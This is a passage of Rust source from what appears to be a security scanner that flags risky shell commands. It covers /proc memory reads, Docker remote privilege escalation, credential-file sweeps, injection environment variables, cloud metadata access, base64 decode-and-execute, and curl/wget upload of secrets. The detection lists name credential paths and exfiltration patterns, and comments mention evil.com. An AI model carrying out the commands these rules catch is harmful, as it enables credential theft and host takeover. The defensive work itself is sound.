                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
            // dd-style: if=/proc/self/mem
            if let Some(val) = normalized.strip_prefix("if=") {
                if PROC_MEM_RE.is_match(val) {
                    findings.push(Finding {
                        rule_id: RuleId::ProcMemAccess,
                        severity: Severity::High,
                        title: "Process memory access detected".to_string(),
                        description: "Command reads from /proc/*/mem via dd, which can dump \
                                      process memory contents including secrets and credentials"
                            .to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "proc memory read".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Docker remote privilege escalation detection
// ---------------------------------------------------------------------------

fn check_docker_remote_privesc(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if resolved_cmd != "docker" && resolved_cmd != "podman" {
            continue;
        }

        let norm_args: Vec<String> = effective_seg
            .args
            .iter()
            .map(|a| normalize_shell_token(a, shell))
            .collect();

        let has_remote = detect_docker_remote_host(&norm_args, &effective_seg, shell);
        if !has_remote {
            continue;
        }

        let has_priv = norm_args.iter().any(|a| a == "--privileged");
        let has_root_mount = has_docker_root_mount(&norm_args);

        if has_priv || has_root_mount {
            findings.push(Finding {
                rule_id: RuleId::DockerRemotePrivEsc,
                severity: Severity::Critical,
                title: "Docker remote privileged escalation detected".to_string(),
                description: "Command targets a remote Docker daemon with privileged access or \
                              host root mount, enabling full host compromise"
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "docker remote privesc".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

fn detect_docker_remote_host(
    norm_args: &[String],
    seg: &tokenize::Segment,
    shell: ShellType,
) -> bool {
    for (i, arg) in norm_args.iter().enumerate() {
        let lower = arg.to_lowercase();
        // -H=tcp://... or --host=tcp://... (combined form, quotes already stripped)
        if arg.starts_with("-H=tcp://") || lower.starts_with("--host=tcp://") {
            return true;
        }
        // -H tcp://... or --host tcp://... (flag + next arg)
        if arg == "-H" || lower == "--host" {
            if let Some(next) = norm_args.get(i + 1) {
                if next.starts_with("tcp://") {
                    return true;
                }
            }
        }
    }
    // DOCKER_HOST=tcp://... as env prefix (Path A: direct leading env assignment)
    for (name, value) in tokenize::leading_env_assignments(&seg.raw) {
        if name.eq_ignore_ascii_case("DOCKER_HOST") {
            let clean_val = normalize_shell_token(&value, shell);
            if clean_val.starts_with("tcp://") {
                return true;
            }
        }
    }
    // Path B: env wrapper form (env DOCKER_HOST=tcp://... docker ...)
    // Skip DOCKER_HOST= args that follow -e/--env (those set container env, not client remote)
    let args = &seg.args;
    for (i, arg) in args.iter().enumerate() {
        let norm = normalize_shell_token(arg, shell);
        if let Some(val) = norm
            .strip_prefix("DOCKER_HOST=")
            .or_else(|| norm.strip_prefix("docker_host="))
        {
            // Check if this arg is a container -e/--env value (not client config)
            if i > 0 {
                let prev = normalize_shell_token(&args[i - 1], shell);
                let prev_lower = prev.to_lowercase();
                if prev_lower == "-e" || prev_lower == "--env" {
                    continue; // container env, not client remote
                }
            }
            let clean_val = normalize_shell_token(val, shell);
            if clean_val.starts_with("tcp://") {
                return true;
            }
        }
    }
    false
}

fn has_docker_root_mount(norm_args: &[String]) -> bool {
    for (i, arg) in norm_args.iter().enumerate() {
        let lower = arg.to_lowercase();
        // -v /:/... or --volume /:/... (flag + next value)
        if lower == "-v" || lower == "--volume" {
            if let Some(val) = norm_args.get(i + 1) {
                if val.starts_with("/:/") {
                    return true;
                }
            }
        }
        // -v=/:/... or --volume=/:/...
        if lower.starts_with("-v=/:/") || lower.starts_with("--volume=/:/") {
            return true;
        }
        // --mount type=bind,src=/,dst=/...
        let mount_val = if lower == "--mount" {
            norm_args.get(i + 1).map(|s| s.as_str())
        } else {
            lower.strip_prefix("--mount=")
        };
        if let Some(mv) = mount_val {
            if mv.contains("src=/,")
                || mv.contains("source=/,")
                || mv.ends_with("src=/")
                || mv.ends_with("source=/")
            {
                return true;
            }
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Credential file sweep detection
// ---------------------------------------------------------------------------

const CREDENTIAL_PATHS: &[&str] = &[
    "/.ssh/id_",
    "/.ssh/authorized_keys",
    "/.aws/credentials",
    "/.aws/config",
    "/.docker/config.json",
    "/.kube/config",
    "/.config/gcloud/",
    "/.npmrc",
    "/.pypirc",
    "/.netrc",
    "/.gnupg/",
    "/.config/gh/",
    "/.git-credentials",
];

const READ_ARCHIVE_VERBS: &[&str] = &[
    "cat", "tar", "zip", "gzip", "strings", "head", "tail", "base64", "xxd", "dd", "cp", "find",
    "xargs",
];

fn check_credential_file_sweep(
    segments: &[tokenize::Segment],
    shell: ShellType,
    context: ScanContext,
    findings: &mut Vec<Finding>,
) {
    if context != ScanContext::Exec {
        return;
    }

    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if !READ_ARCHIVE_VERBS.contains(&resolved_cmd.as_str()) {
            continue;
        }

        let norm_args: Vec<String> = effective_seg
            .args
            .iter()
            .map(|a| normalize_shell_token(a, shell))
            .collect();
        let seg_text = norm_args.join(" ");
        let matched_count = CREDENTIAL_PATHS
            .iter()
            .filter(|p| seg_text.contains(**p))
            .count();

        if matched_count >= 2 {
            findings.push(Finding {
                rule_id: RuleId::CredentialFileSweep,
                severity: Severity::Medium,
                title: "Multiple credential files accessed".to_string(),
                description: format!(
                    "Command accesses {matched_count} known credential file paths in a single \
                     invocation, which may indicate credential harvesting"
                ),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "credential file sweep".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

// ---------------------------------------------------------------------------
// Phase 8: Dangerous environment variable detection
// ---------------------------------------------------------------------------

/// Environment variables that enable arbitrary code injection via dynamic linker.
const CODE_INJECTION_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
];

/// Environment variables that cause arbitrary script execution at shell startup.
const SHELL_INJECTION_VARS: &[&str] = &["BASH_ENV", "ENV", "PROMPT_COMMAND"];

/// Environment variables that hijack interpreter module/library search paths.
const INTERPRETER_HIJACK_VARS: &[&str] = &["PYTHONPATH", "NODE_OPTIONS", "RUBYLIB", "PERL5LIB"];

/// Sensitive credential variable names that should not be exported in commands.
use super::shared::SENSITIVE_KEY_VARS;

fn classify_env_var(name: &str) -> Option<(RuleId, Severity, &'static str, &'static str)> {
    let name_upper = name.to_ascii_uppercase();
    let name = name_upper.as_str();
    if CODE_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::CodeInjectionEnv,
            Severity::Critical,
            "Code injection environment variable",
            "can inject shared libraries into all processes, enabling arbitrary code execution",
        ))
    } else if SHELL_INJECTION_VARS.contains(&name) {
        Some((
            RuleId::ShellInjectionEnv,
            Severity::Critical,
            "Shell injection environment variable",
            "can cause arbitrary script execution at shell startup",
        ))
    } else if INTERPRETER_HIJACK_VARS.contains(&name) {
        Some((
            RuleId::InterpreterHijackEnv,
            Severity::High,
            "Interpreter hijack environment variable",
            "can hijack the interpreter's module/library search path",
        ))
    } else if SENSITIVE_KEY_VARS.contains(&name) {
        Some((
            RuleId::SensitiveEnvExport,
            Severity::High,
            "Sensitive credential exported",
            "exposes a sensitive credential that may be logged in shell history",
        ))
    } else {
        None
    }
}

/// Cargo global flags that consume the next token as a value.
const CARGO_VALUE_FLAGS: &[&str] = &[
    "-Z",
    "-C",
    "--config",
    "--manifest-path",
    "--color",
    "--target-dir",
    "--target",
];

/// Find the cargo subcommand (first positional arg), skipping flags and toolchain specs.
/// Returns true if the subcommand is `install` or `add`.
fn is_cargo_install_or_add(args: &[String]) -> bool {
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // Toolchain specs (+nightly, +stable)
        if arg.starts_with('+') {
            continue;
        }
        // Long flags with = (--config=foo): skip this arg only
        if arg.starts_with("--") && arg.contains('=') {
            continue;
        }
        // Known value-taking flags: skip this AND next
        if CARGO_VALUE_FLAGS.contains(&arg.as_str()) {
            skip_next = true;
            continue;
        }
        // Other flags (--locked, -v, etc.)
        if arg.starts_with('-') {
            continue;
        }
        // First positional arg is the subcommand — only match install/add
        return arg == "install" || arg == "add";
    }
    false
}

/// Warn when `cargo install/add` is used and no supply-chain audit directory exists.
fn check_vet_not_configured(
    segments: &[tokenize::Segment],
    cwd: Option<&str>,
    findings: &mut Vec<Finding>,
) {
    let is_cargo_install = segments.iter().any(|s| {
        if let Some(ref cmd) = s.command {
            let base = cmd
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(cmd)
                .to_ascii_lowercase();
            let base = base.strip_suffix(".exe").unwrap_or(&base);
            if base == "cargo" {
                return is_cargo_install_or_add(&s.args);
            }
        }
        false
    });
    if !is_cargo_install {
        return;
    }

    // Check if supply-chain/ config exists relative to the analysis context cwd.
    // Require an explicit cwd — without one we cannot reliably check the filesystem.
    let cwd = match cwd {
        Some(dir) => dir,
        None => return,
    };
    let check_path = std::path::PathBuf::from(cwd).join("supply-chain/config.toml");
    if check_path.exists() {
        return;
    }

    findings.push(Finding {
        rule_id: RuleId::VetNotConfigured,
        severity: Severity::Low,
        title: "No supply-chain audit configured".into(),
        description: "Consider running `cargo vet init` to enable dependency auditing.".into(),
        evidence: vec![],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn check_env_var_in_command(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();

        match cmd_base.as_str() {
            "export" => {
                for arg in &segment.args {
                    if let Some((var_name, value)) = arg.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "env" => {
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') {
                        continue;
                    }
                    if let Some((var_name, value)) = trimmed.split_once('=') {
                        emit_env_finding(var_name.trim(), value, findings);
                    }
                }
            }
            "set" => {
                // Fish shell: set [-gx] VAR_NAME value...
                let mut var_name: Option<&str> = None;
                let mut value_parts: Vec<&str> = Vec::new();
                for arg in &segment.args {
                    let trimmed = arg.trim();
                    if trimmed.starts_with('-') && var_name.is_none() {
                        continue;
                    }
                    if var_name.is_none() {
                        var_name = Some(trimmed);
                    } else {
                        value_parts.push(trimmed);
                    }
                }
                if let Some(name) = var_name {
                    emit_env_finding(name, &value_parts.join(" "), findings);
                }
            }
            _ => {}
        }
    }
}

fn emit_env_finding(var_name: &str, value: &str, findings: &mut Vec<Finding>) {
    let Some((rule_id, severity, title_prefix, desc_suffix)) = classify_env_var(var_name) else {
        return;
    };
    let value_preview = redact_env_value(value);
    findings.push(Finding {
        rule_id,
        severity,
        title: format!("{title_prefix}: {var_name}"),
        description: format!("Setting {var_name} {desc_suffix}"),
        evidence: vec![Evidence::EnvVar {
            name: var_name.to_string(),
            value_preview,
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

fn redact_env_value(val: &str) -> String {
    if val.is_empty() {
        String::new()
    } else {
        "[REDACTED]".to_string()
    }
}

// ---------------------------------------------------------------------------
// Phase 9 (free): Network destination detection
// ---------------------------------------------------------------------------

/// Cloud metadata endpoint IPs that expose instance credentials.
const METADATA_ENDPOINTS: &[&str] = &["169.254.169.254", "100.100.100.200"];

fn check_host_for_network_issues(arg: &str, findings: &mut Vec<Finding>) {
    if let Some(host) = extract_host_from_arg(arg) {
        if METADATA_ENDPOINTS.contains(&host.as_str()) {
            findings.push(Finding {
                rule_id: RuleId::MetadataEndpoint,
                severity: Severity::Critical,
                title: format!("Cloud metadata endpoint access: {host}"),
                description: format!(
                    "Command accesses cloud metadata endpoint {host}, \
                     which can expose instance credentials and sensitive configuration"
                ),
                evidence: vec![Evidence::Url {
                    raw: arg.to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        } else if is_private_ip(&host) {
            findings.push(Finding {
                rule_id: RuleId::PrivateNetworkAccess,
                severity: Severity::High,
                title: format!("Private network access: {host}"),
                description: format!(
                    "Command accesses private network address {host}, \
                     which may indicate SSRF or lateral movement"
                ),
                evidence: vec![Evidence::Url {
                    raw: arg.to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
}

fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        for arg in &segment.args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                // Check flag=value args for embedded URLs (e.g., --url=http://evil.com)
                if let Some((_flag, value)) = trimmed.split_once('=') {
                    check_host_for_network_issues(value, findings);
                }
                continue;
            }

            check_host_for_network_issues(trimmed, findings);
        }
    }
}

/// Extract a host/IP from a URL-like command argument.
fn extract_host_from_arg(arg: &str) -> Option<String> {
    // URL with scheme: http://HOST[:PORT]/path
    if let Some(scheme_end) = arg.find("://") {
        let after_scheme = &arg[scheme_end + 3..];
        // Strip userinfo (anything before @)
        let after_userinfo = if let Some(at_idx) = after_scheme.find('@') {
            &after_scheme[at_idx + 1..]
        } else {
            after_scheme
        };
        // Get host:port (before first /)
        let host_port = after_userinfo.split('/').next().unwrap_or(after_userinfo);
        let host = strip_port(host_port);
        // Reject obviously invalid hosts (malformed brackets, embedded paths)
        if host.is_empty() || host.contains('/') || host.contains('[') {
            return None;
        }
        return Some(host);
    }

    // Bare host/IP: "169.254.169.254/path" or just "169.254.169.254"
    let host_part = arg.split('/').next().unwrap_or(arg);
    let host = strip_port(host_part);

    // Accept valid IPv4 addresses for bare hosts (no scheme)
    if host.parse::<std::net::Ipv4Addr>().is_ok() {
        return Some(host);
    }

    // Accept bracketed IPv6: [::1]
    if host_part.starts_with('[') {
        if let Some(bracket_end) = host_part.find(']') {
            let ipv6 = &host_part[1..bracket_end];
            if ipv6.parse::<std::net::Ipv6Addr>().is_ok() {
                return Some(ipv6.to_string());
            }
        }
    }

    None
}

/// Strip port number from a host:port string, handling IPv6 brackets.
fn strip_port(host_port: &str) -> String {
    // Handle IPv6: [::1]:8080
    if host_port.starts_with('[') {
        if let Some(bracket_end) = host_port.find(']') {
            return host_port[1..bracket_end].to_string();
        }
    }
    // Don't strip from unbracketed IPv6 (multiple colons)
    let colon_count = host_port.chars().filter(|&c| c == ':').count();
    if colon_count > 1 {
        return host_port.to_string(); // IPv6, don't strip
    }
    // IPv4 or hostname with single colon: strip trailing :PORT
    if let Some(colon_idx) = host_port.rfind(':') {
        if host_port[colon_idx + 1..].parse::<u16>().is_ok() {
            return host_port[..colon_idx].to_string();
        }
    }
    host_port.to_string()
}

/// Check if an IPv4 address is in a private/reserved range (excluding loopback).
fn is_private_ip(host: &str) -> bool {
    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
        let octets = ip.octets();
        // Loopback (127.x) is excluded — local traffic has no SSRF/lateral movement risk.
        if octets[0] == 127 {
            return false;
        }
        return octets[0] == 10
            || (octets[0] == 172 && (16..=31).contains(&octets[1]))
            || (octets[0] == 192 && octets[1] == 168);
    }
    false
}

/// POSIX fetch commands — appropriate for both `tirith run` and `vet` hints.
const POSIX_FETCH_COMMANDS: &[&str] = &["curl", "wget", "http", "https", "xh", "fetch"];

/// PowerShell fetch commands — appropriate for `vet` hints only
/// (`tirith run` doesn't support PowerShell interpreter flows).
const POWERSHELL_FETCH_COMMANDS: &[&str] =
    &["iwr", "irm", "invoke-webrequest", "invoke-restmethod"];

/// Source commands that are not URL-fetching (no vet/tirith-run hints).
const NON_FETCH_SOURCE_COMMANDS: &[&str] = &["scp", "rsync"];

fn is_source_command(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd)
        || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
        || NON_FETCH_SOURCE_COMMANDS.contains(&cmd)
}

/// All URL-fetching commands (union of POSIX + PowerShell).
fn is_url_fetch_command(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd) || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
}

/// Whether this fetch source supports `tirith run` hints.
/// True only for POSIX fetch commands (`tirith run` is a shell-script runner).
fn supports_tirith_run_hint(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd)
}

/// Check if string starts with http:// or https:// (case-insensitive scheme).
fn starts_with_http_scheme(s: &str) -> bool {
    let b = s.as_bytes();
    (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
        || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
}

/// Strip control characters (0x00–0x1F, 0x7F) from a URL so it cannot inject
/// ANSI escapes, newlines, or other terminal-interpreted sequences into the
/// finding description displayed to the user.
fn sanitize_url_for_display(url: &str) -> String {
    url.chars().filter(|&c| !c.is_ascii_control()).collect()
}

/// Extract all URLs from command arguments.
fn extract_urls_from_args(args: &[String], shell: ShellType) -> Vec<String> {
    let mut urls = Vec::new();
    for arg in args {
        let normalized = normalize_shell_token(arg.trim(), shell);

        if starts_with_http_scheme(&normalized) {
            urls.push(normalized);
            continue;
        }

        // Check --flag=<url> forms (e.g., --url=https://...)
        if let Some((_, val)) = normalized.split_once('=') {
            if starts_with_http_scheme(val) {
                urls.push(val.to_string());
            }
        }
    }
    urls
}

/// Check command destination hosts against policy network deny/allow lists.
///
/// For each source command (curl, wget, etc.), extracts the destination host and
/// checks against deny/allow lists. Allow takes precedence (exempts from deny).
pub fn check_network_policy(
    input: &str,
    shell: ShellType,
    deny: &[String],
    allow: &[String],
) -> Vec<Finding> {
    if deny.is_empty() {
        return Vec::new();
    }

    let segments = tokenize::tokenize(input, shell);
    let mut findings = Vec::new();

    for segment in &segments {
        let Some(ref cmd) = segment.command else {
            continue;
        };
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        for arg in &segment.args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                // Check flag=value args for embedded URLs (e.g., --url=http://evil.com)
                if let Some((_flag, value)) = trimmed.split_once('=') {
                    if let Some(host) = extract_host_from_arg(value) {
                        if matches_network_list(&host, allow) {
                            continue;
                        }
                        if matches_network_list(&host, deny) {
                            findings.push(Finding {
                                rule_id: RuleId::CommandNetworkDeny,
                                severity: Severity::Critical,
                                title: format!("Network destination denied by policy: {host}"),
                                description: format!(
                                    "Command accesses {host}, which is on the network deny list"
                                ),
                                evidence: vec![Evidence::Url {
                                    raw: value.to_string(),
                                }],
                                human_view: None,
                                agent_view: None,
                                mitre_id: None,
                                custom_rule_id: None,
                            });
                            continue;
                        }
                    }
                }
                continue;
            }

            if let Some(host) = extract_host_from_arg(trimmed) {
                // Allow list exempts from deny
                if matches_network_list(&host, allow) {
                    continue;
                }
                if matches_network_list(&host, deny) {
                    findings.push(Finding {
                        rule_id: RuleId::CommandNetworkDeny,
                        severity: Severity::Critical,
                        title: format!("Network destination denied by policy: {host}"),
                        description: format!(
                            "Command accesses {host}, which is on the network deny list"
                        ),
                        evidence: vec![Evidence::Url {
                            raw: trimmed.to_string(),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return findings;
                }
            }
        }
    }

    findings
}

/// Check if a host matches any entry in a network list.
///
/// Supports exact hostname match, suffix match (`.example.com` matches
/// `sub.example.com`), and CIDR match for IPv4 addresses.
fn matches_network_list(host: &str, list: &[String]) -> bool {
    for entry in list {
        // CIDR match: "10.0.0.0/8"
        if entry.contains('/') {
            if let Some(matched) = cidr_contains(host, entry) {
                if matched {
                    return true;
                }
                continue;
            }
        }

        // Exact match
        if host.eq_ignore_ascii_case(entry) {
            return true;
        }

        // Suffix match: entry "example.com" matches "sub.example.com"
        if host.len() > entry.len()
            && host.ends_with(entry.as_str())
            && host.as_bytes()[host.len() - entry.len() - 1] == b'.'
        {
            return true;
        }
    }
    false
}

/// Check if an IPv4 address is within a CIDR range.
/// Returns `Some(true/false)` if both parse, `None` if either fails.
fn cidr_contains(host: &str, cidr: &str) -> Option<bool> {
    let parts: Vec<&str> = cidr.splitn(2, '/').collect();
    if parts.len() != 2 {
        return None;
    }
    let network: std::net::Ipv4Addr = parts[0].parse().ok()?;
    let prefix_len: u32 = parts[1].parse().ok()?;
    if prefix_len > 32 {
        return None;
    }
    let host_ip: std::net::Ipv4Addr = host.parse().ok()?;

    let mask = if prefix_len == 0 {
        0u32
    } else {
        !0u32 << (32 - prefix_len)
    };
    let net_bits = u32::from(network) & mask;
    let host_bits = u32::from(host_ip) & mask;

    Some(net_bits == host_bits)
}

// ---------------------------------------------------------------------------
// Base64 decode-execute detection
// ---------------------------------------------------------------------------

fn check_base64_decode_execute(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    // Pattern A: Pipe chain — base64 with decode flag piped to interpreter
    for (i, seg) in segments.iter().enumerate() {
        if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if cmd_base == "base64" {
                let has_decode_flag = seg.args.iter().any(|arg| {
                    let norm = normalize_shell_token(arg, shell);
                    matches!(norm.as_str(), "-d" | "--decode" | "-D")
                });
                if has_decode_flag {
                    // Check if next piped segment is an interpreter
                    if let Some(next_seg) = segments.get(i + 1) {
                        if let Some(ref sep) = next_seg.preceding_separator {
                            if (sep == "|" || sep == "|&")
                                && resolve_interpreter_name(next_seg, shell).is_some()
                            {
                                findings.push(Finding {
                                    rule_id: RuleId::Base64DecodeExecute,
                                    severity: Severity::High,
                                    title: "Base64 decode piped to interpreter".to_string(),
                                    description: "Command decodes base64 content and pipes it directly to an interpreter for execution".to_string(),
                                    evidence: vec![Evidence::CommandPattern {
                                        pattern: "base64 decode | interpreter".to_string(),
                                        matched: redact::redact_shell_assignments(&format!(
                                            "{} | {}", seg.raw, next_seg.raw
                                        )),
                                    }],
                                    human_view: None,
                                    agent_view: None,
                                    mitre_id: None,
                                    custom_rule_id: None,
                                });
                            }
                        }
                    }
                }
            }
        }

        // Also check: something piped to base64 -d piped to interpreter
        // e.g. echo X | base64 -d | bash — base64 is mid-chain
        if i >= 1 {
            if let Some(ref sep) = seg.preceding_separator {
                if sep == "|" || sep == "|&" {
                    if let Some(ref cmd) = seg.command {
                        let cmd_base = normalize_cmd_base(cmd, shell);
                        if cmd_base == "base64" {
                            let has_decode = seg.args.iter().any(|arg| {
                                let norm = normalize_shell_token(arg, shell);
                                matches!(norm.as_str(), "-d" | "--decode" | "-D")
                            });
                            if has_decode {
                                if let Some(next_seg) = segments.get(i + 1) {
                                    if let Some(ref next_sep) = next_seg.preceding_separator {
                                        if (next_sep == "|" || next_sep == "|&")
                                            && resolve_interpreter_name(next_seg, shell).is_some()
                                        {
                                            // Only fire if we didn't already fire above (when i was the base64 segment)
                                            let already_found = findings
                                                .iter()
                                                .any(|f| f.rule_id == RuleId::Base64DecodeExecute);
                                            if !already_found {
                                                findings.push(Finding {
                                                    rule_id: RuleId::Base64DecodeExecute,
                                                    severity: Severity::High,
                                                    title: "Base64 decode piped to interpreter".to_string(),
                                                    description: "Command decodes base64 content and pipes it directly to an interpreter for execution".to_string(),
                                                    evidence: vec![Evidence::CommandPattern {
                                                        pattern: "base64 decode | interpreter".to_string(),
                                                        matched: redact::redact_shell_assignments(&format!(
                                                            "{} | {}", seg.raw, next_seg.raw
                                                        )),
                                                    }],
                                                    human_view: None,
                                                    agent_view: None,
                                                    mitre_id: None,
                                                    custom_rule_id: None,
                                                });
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Pattern B: Inline decode-execute — interpreter -c/-e with decode+execute tokens
    // Uses resolve_interpreter_name to handle wrappers (sudo, env, command, nohup, exec)
    for seg in segments {
        // Resolve through wrappers: sudo python → python, env node → node
        let interpreter = if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if is_interpreter(&cmd_base) {
                Some(cmd_base)
            } else {
                resolve_interpreter_name(seg, shell)
            }
        } else {
            None
        };

        if let Some(interp) = interpreter {
            // Check ALL args (including wrapper args) for -c/-e and decode+execute tokens
            let has_exec_flag = seg.args.iter().any(|arg| {
                let norm = normalize_shell_token(arg, shell);
                norm == "-c" || norm == "-e"
            });
            if has_exec_flag {
                let args_joined = seg.args.join(" ");
                let lower = args_joined.to_lowercase();
                let has_decode_exec = (lower.contains("b64decode") && lower.contains("exec"))
                    || (lower.contains("atob") && lower.contains("eval"))
                    || (lower.contains("buffer.from") && lower.contains("eval"));
                if has_decode_exec {
                    findings.push(Finding {
                        rule_id: RuleId::Base64DecodeExecute,
                        severity: Severity::High,
                        title: "Inline base64 decode-execute".to_string(),
                        description: format!(
                            "Interpreter '{interp}' executes code with base64 decode and eval/exec co-occurrence"
                        ),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "interpreter -c/e with decode+execute".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }

    // Pattern C: PowerShell -EncodedCommand / -enc / -ec
    for seg in segments {
        if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if cmd_base == "powershell" || cmd_base == "pwsh" {
                let has_enc_flag = seg.args.iter().any(|arg| {
                    let norm = normalize_shell_token(arg, shell);
                    let lower = norm.to_lowercase();
                    lower == "-encodedcommand" || lower == "-enc" || lower == "-ec"
                });
                if has_enc_flag {
                    findings.push(Finding {
                        rule_id: RuleId::Base64DecodeExecute,
                        severity: Severity::High,
                        title: "PowerShell encoded command".to_string(),
                        description: format!(
                            "PowerShell ({cmd_base}) invoked with -EncodedCommand, executing base64-encoded script"
                        ),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "powershell -EncodedCommand".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Data exfiltration detection (POSIX + Fish: curl/wget upload of sensitive data)
// ---------------------------------------------------------------------------

/// Sensitive file paths for data exfiltration detection.
const SENSITIVE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/id_ecdsa",
    "~/.ssh/id_dsa",
    "~/.aws/credentials",
    "~/.kube/config",
    "~/.docker/config.json",
    "~/.gnupg/",
    "~/.netrc",
    "~/.git-credentials",
];

fn is_sensitive_file_ref(value: &str) -> bool {
    let v = value.trim_start_matches('@');
    SENSITIVE_PATHS.iter().any(|p| v.contains(p))
}

fn has_sensitive_env_ref(value: &str) -> bool {
    use crate::rules::shared::SENSITIVE_KEY_VARS;
    for var in SENSITIVE_KEY_VARS {
        // $VAR or ${VAR}
        if value.contains(&format!("${var}")) || value.contains(&format!("${{{var}}}")) {
            return true;
        }
    }
    false
}

fn has_sensitive_cmd_substitution(value: &str) -> bool {
    // Check for $(cmd) with sensitive paths — no backtick detection (PowerShell conflict)
    if let Some(start) = value.find("$(") {
        let rest = &value[start..];
        return SENSITIVE_PATHS.iter().any(|p| rest.contains(p));
    }
    false
}

fn check_data_exfiltration(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some(ref cmd) = seg.command else {
            continue;
        };
        let cmd_base = normalize_cmd_base(cmd, shell);

        match cmd_base.as_str() {
            "curl" => check_curl_exfiltration(seg, shell, findings),
            "wget" => check_wget_exfiltration(seg, shell, findings),
            _ => {}
        }
    }
}

fn check_curl_exfiltration(seg: &tokenize::Segment, shell: ShellType, findings: &mut Vec<Finding>) {
    let args = &seg.args;
    let mut i = 0;
    while i < args.len() {
        let norm = normalize_shell_token(&args[i], shell);

        // -d / --data / --data-binary / --data-raw / --data-urlencode
        let is_data_flag =
            norm == "-d" || norm.starts_with("--data") || norm.starts_with("-d") && norm.len() > 2; // combined form -dVAL

        // -F / --form
        let is_form_flag =
            norm == "-F" || norm.starts_with("--form") || norm.starts_with("-F") && norm.len() > 2;

        // -T / --upload-file
        let is_upload_flag = norm == "-T" || norm.starts_with("--upload-file");

        if is_data_flag || is_form_flag || is_upload_flag {
            // Get the value: either from =VAL, combined form, or next arg
            let value = if let Some(eq_pos) = norm.find('=') {
                Some(norm[eq_pos + 1..].to_string())
            } else if (norm == "-d"
                || norm == "-F"
                || norm == "-T"
                || norm == "--data"
                || norm == "--data-binary"
                || norm == "--data-raw"
                || norm == "--data-urlencode"
                || norm == "--form"
